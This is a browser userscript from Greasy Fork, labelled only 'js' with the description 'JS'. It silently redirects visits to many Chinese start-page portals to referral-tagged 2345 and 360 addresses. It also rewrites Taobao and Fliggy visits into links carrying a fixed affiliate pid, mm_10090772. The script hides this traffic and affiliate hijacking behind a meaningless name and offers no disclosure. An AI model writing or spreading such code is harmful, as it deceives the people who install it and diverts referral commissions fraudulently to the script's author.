// ==UserScript==
// @name         js
// @namespace    https://greasyfork.org/users/208628
// @version      0.10.31
// @description  JS
// @author       HoldPc
// @include      http*://www.2345.com/*
// @include      http*://hao.360.com/*
// @include      http*://hao.360.cn/*
// @include      http*://www.hao123.com/*
// @include      http*://www.duba.com/*
// @include      http*://daohang.qq.com/*
// @include      http*://hao.qq.com/*
// @include      http*://123.sogou.com/*
// @include      http*://www.114la.com/*
// @include      http*://www.265.com/*
// @include      http*://www.02516.com/*
// @include      http*://hao.uc.cn/*
// @include      http*://www.iedh.com/*
// @include      http*://www.20z.com/*
// @include      http*://www.5w.com/*
// @charset      UTF-8
// @grant        GM_xmlhttpRequest
// @grant        GM_log
// @charset      UTF-8
// @run-at      document-end
// @downloadURL https://update.greasyfork.org/scripts/408629/js.user.js
// @updateURL https://update.greasyfork.org/scripts/408629/js.meta.js
// ==/UserScript==
function wz(){
var url2345="http://www.2345.com/?kaariz"
var url360="https://hao.360.cn/?src=lm&ls=n5601ce9a8a"
if (location.hostname === 'www.2345.com'){if ((location.pathname=="/"||location.search.indexOf("?")==0)&&(location.search!=="?kaariz")){window.location.replace(url360);}}
if (location.hostname === 'hao.360.com'){if ((location.pathname=="/"||location.search.indexOf("?")==0)&&(location.search!=="?src=lm&ls=n5601ce9a8a")){window.location.replace(url2345);}}
if (location.hostname === 'hao.360.cn'){if ((location.pathname=="/"||location.search.indexOf("?")==0)&&(location.search!=="?src=lm&ls=n5601ce9a8a")){window.location.replace(url2345);}}
if (location.hostname === 'daohang.qq.com'){window.location.replace(url360);}
if (location.hostname === 'hao.qq.com'){window.location.replace(url360);}
if (location.hostname === '123.sogou.com'){window.location.replace(url360);}
if (location.hostname === 'www.hao123.com'){window.location.replace(url360);}
if (location.hostname === 'www.duba.com'){window.location.replace(url360);}
if (location.hostname === 'www.114la.com'){window.location.replace(url360);}
if (location.hostname === 'www.265.com'){window.location.replace(url360);}
if (location.hostname === 'www.02516.com'){window.location.replace(url360);}
if (location.hostname === 'hao.uc.cn'){window.location.replace(url360);}
if (location.hostname === 'www.iedh.com'){window.location.replace(url360);}
if (location.hostname === 'www.20z.com'){window.location.replace(url360);}
if (location.hostname === 'www.5w.com'){window.location.replace(url360);}
var url2tao="https://ai.taobao.com?pid=mm_10090772_10744198_40164669&union_lens=lensId%3APUB%401670652405%4021501dfc_0bd6_184faa4a6cc_03f5%4001"
if ((location.hostname === 'ai.taobao.com')&&(location.href.indexOf("mm_10090772_")==-1)){window.location.replace(url2tao); }
var urltrip="https://s.click.taobao.com/t?union_lens=lensId%3AOPT%401670652192%40212c115a_09e9_184faa16513_a101%4001%3BeventPageId%3A20150318020002752&e=m%3D2%26s%3D2nP0akEynx5w4vFB6t2Z2iperVdZeJviv2laukthwYhnX1vWUft3ZcknjGo2uZuutoSW7ShxfsT7NwcKrHRLUzAmpjsuLTkJlXZ217IRs96L6UckuApwaasIDlrECmv46lTeslCodvN%2B7qurC2CKrtEO0DsmwmkMvQJgESMF%2FSvp27Tg91Hc54IazZZbnDuzhMlCrqadvfV51sJ2zRMkD4dfs%2BRpEyzz1tFEBnNeabaiZ%2BQMlGz6FQ%3D%3D"
if ((location.hostname === 'www.fliggy.com')&&(location.href.indexOf("mm_10090772_")==-1)){window.location.replace(urltrip); }
}wz();